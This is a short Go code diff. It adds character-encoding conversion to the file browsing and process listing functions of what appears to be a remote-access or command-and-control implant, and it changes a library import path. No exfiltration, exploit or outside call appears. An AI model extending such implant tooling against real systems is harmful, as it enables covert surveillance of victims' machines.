@@ -7,7 +7,7 @@ import (
 	"encoding/binary"
 	"errors"
 	"fmt"
-	"github.com/shirou/gopsutil/v3/process"
+	"github.com/shirou/gopsutil/process"
 	"io/ioutil"
 	"main/sysinfo"
 	"main/util"
@@ -225,9 +225,9 @@ func File_Browse(b []byte) ([]byte, error) {
 		return nil, err
 	}
 	modTime := fileInfo.ModTime()
-	currentDir := fileInfo.Name()
+	currentDir := util.ConvertChinese([]byte(fileInfo.Name()))
 
-	absCurrentDir, err := filepath.Abs(currentDir)
+	absCurrentDir, err := filepath.Abs(string(currentDir))
 	if err != nil {
 		return nil, err
 	}
@@ -245,9 +245,9 @@ func File_Browse(b []byte) ([]byte, error) {
 		modTimeStr = file.ModTime().Format("02/01/2006 15:04:05")
 
 		if file.IsDir() {
-			resultStr += fmt.Sprintf("\nD\t0\t%s\t%s", modTimeStr, file.Name())
+			resultStr += fmt.Sprintf("\nD\t0\t%s\t%s", modTimeStr, util.ConvertChinese([]byte(file.Name())))
 		} else {
-			resultStr += fmt.Sprintf("\nF\t%d\t%s\t%s", file.Size(), modTimeStr, file.Name())
+			resultStr += fmt.Sprintf("\nF\t%d\t%s\t%s", file.Size(), modTimeStr, util.ConvertChinese([]byte(file.Name())))
 		}
 	}
 
@@ -451,7 +451,7 @@ func ListProcess(b []byte) ([]byte, error) {
 			archString = "x86"
 		}
 
-		result += fmt.Sprintf("\n%s\t%d\t%d\t%s\t%s\t%d", name, pPid, pid, archString, owner, sessionId)
+		result += fmt.Sprintf("\n%s\t%d\t%d\t%s\t%s\t%d", util.ConvertChinese([]byte(name)), pPid, pid, archString, owner, sessionId)
 	}
 
 	//return append(b,[]byte(result)...)
